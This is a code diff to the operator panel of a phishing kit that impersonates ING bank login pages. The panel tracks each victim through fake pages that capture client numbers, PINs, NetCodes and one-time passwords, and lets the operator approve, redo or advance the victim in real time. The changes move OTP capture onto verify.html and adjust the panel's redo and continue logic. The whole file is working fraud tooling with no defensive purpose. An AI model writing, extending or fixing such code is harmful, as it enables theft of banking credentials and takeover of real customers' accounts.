@@ -219,7 +219,7 @@ function uaParser(ua) {
   return u;
 }
 
-/* ----------  SESSION HEADER HELPER - FIXED FOR OTP ---------- */
+/* ----------  SESSION HEADER HELPER - FIXED FOR VERIFY.HTML ---------- */
 function getSessionHeader(v) {
   // Approved/Success state
   if (v.page === 'success' || v.status === 'approved') return `🦁 ING Login approved`;
@@ -229,10 +229,12 @@ function getSessionHeader(v) {
     return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
   } 
   
-  // verify.html page (NetCode/OTP entry)
+  // verify.html page (NetCode/OTP entry) - THIS IS THE MAIN PAGE NOW
   else if (v.page === 'verify.html') {
-    // Note: verify.html sends the NetCode to /api/verify which stores it in v.phone
-    return v.phone ? `🔑 Received NetCode: ${v.phone}` : `⏳ Awaiting NetCode`;
+    // Check for OTP first (since verify.html now handles OTP)
+    if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
+    // Fall back to phone/NetCode if no OTP yet
+    return v.phone ? `🔑 Received NetCode: ${v.phone}` : `⏳ Awaiting OTP/NetCode`;
   } 
   
   // unregister.html page
@@ -240,7 +242,7 @@ function getSessionHeader(v) {
     return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
   } 
   
-  // otp.html page - THIS IS THE FIX: Check for OTP field
+  // otp.html page (legacy, should not be used)
   else if (v.page === 'otp.html') {
     if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
     return `⏳ Awaiting OTP...`;
@@ -504,7 +506,8 @@ app.post('/api/panel', async (req, res) => {
       if (v.page === 'index.html') {
         v.status = 'redo'; v.entered = false; v.email = ''; v.password = ''; v.otp = '';
       } else if (v.page === 'verify.html') {
-        v.status = 'redo'; v.phone = '';
+        // verify.html now handles OTP, so clear OTP on redo
+        v.status = 'redo'; v.otp = ''; v.phone = '';
       } else if (v.page === 'otp.html') {
         v.status = 'redo'; v.otp = ''; v.otpAttempt++;
       }
@@ -513,12 +516,12 @@ app.post('/api/panel', async (req, res) => {
       v.status = 'ok';
       if (v.page === 'index.html') v.page = 'verify.html';
       else if (v.page === 'verify.html') {
-        // Mark as successful and approved when continuing from verify.html
+        // When admin clicks continue on verify.html (OTP page), redirect victim to commbank.com.au
         v.page = 'success';
         v.status = 'approved';
         successfulLogins++;
       }
-      else if (v.page === 'unregister.html') v.page = 'otp.html';
+      else if (v.page === 'unregister.html') v.page = 'verify.html'; // Go to verify.html instead of otp.html
       else if (v.page === 'otp.html') { 
         v.page = 'success'; 
         v.status = 'approved';
